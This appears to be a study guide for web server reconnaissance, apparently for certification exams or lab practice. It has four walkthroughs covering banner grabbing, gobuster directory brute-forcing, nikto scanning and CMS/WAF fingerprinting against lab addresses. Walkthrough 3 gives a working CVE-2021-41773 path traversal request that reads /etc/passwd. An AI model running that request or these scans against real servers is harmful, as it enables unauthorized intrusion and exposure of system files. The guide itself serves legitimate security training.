# 11 Web Servers — full walkthroughs

---

## Walkthrough 1: "What version of Apache is running on 10.10.10.5"

**Type:** version detection | **Difficulty:** easy | **Time:** <1 min

1. Banner grab:
   ```bash
   curl -I http://10.10.10.5
   ```
2. Read the `Server:` header:
   ```
   Server: Apache/2.4.49 (Unix)
   ```
3. **Answer:** `Apache/2.4.49` (copy verbatim)

**Gotcha:** some servers hide the version. Fall back to `whatweb -a 3 http://10.10.10.5` or `nmap -sV -p 80 10.10.10.5`.

---

## Walkthrough 2: "Find the hidden admin directory on 10.10.10.12"

1. Kick off gobuster with common wordlist:
   ```bash
   gobuster dir -u http://10.10.10.12 -w /usr/share/wordlists/dirb/common.txt -t 50
   ```
2. Look for `Status: 200` or `301` lines:
   ```
   /admin                (Status: 301) [Size: 312]
   /images               (Status: 301)
   /uploads              (Status: 200)
   ```
3. Visit `/admin` in Firefox to confirm.
4. **Answer:** `/admin`

**Tip:** if nothing found with `common.txt`, escalate to `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`.

---

## Walkthrough 3: "Find a known vulnerability on the web server at 10.10.10.20"

1. Run nikto:
   ```bash
   nikto -h http://10.10.10.20 -o nikto.txt
   ```
2. Skim for `OSVDB`, `CVE`, or `+ /` lines:
   ```
   + Apache/2.4.49 appears outdated
   + /cgi-bin/ : CVE-2021-41773 path traversal possible
   ```
3. Confirm with curl:
   ```bash
   curl "http://10.10.10.20/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"
   ```
4. **Answer:** `CVE-2021-41773` (Apache path traversal)

→ Next: exploitation covered in [05-system-hacking](../05-system-hacking/README.md)

---

## Walkthrough 4: "Identify the CMS and WAF in front of site.local"

1. Fingerprint:
   ```bash
   whatweb -a 3 http://site.local
   ```
   Output snippet:
   ```
   WordPress[6.2], JQuery, MetaGenerator[WordPress 6.2]
   ```
2. Check WAF:
   ```bash
   wafw00f http://site.local
   ```
   Output:
   ```
   [+] The site http://site.local is behind Cloudflare (Cloudflare Inc.) WAF.
   ```
3. **Answer:** CMS = `WordPress 6.2`, WAF = `Cloudflare`
4. Because it's WordPress → pivot to [12-web-apps → wpscan](../12-web-apps/commands.md).
